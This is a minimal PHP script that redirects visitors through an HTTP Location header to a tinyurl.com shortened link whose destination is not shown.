<?php

header('Location: https://tinyurl.com/bpabfury')

?>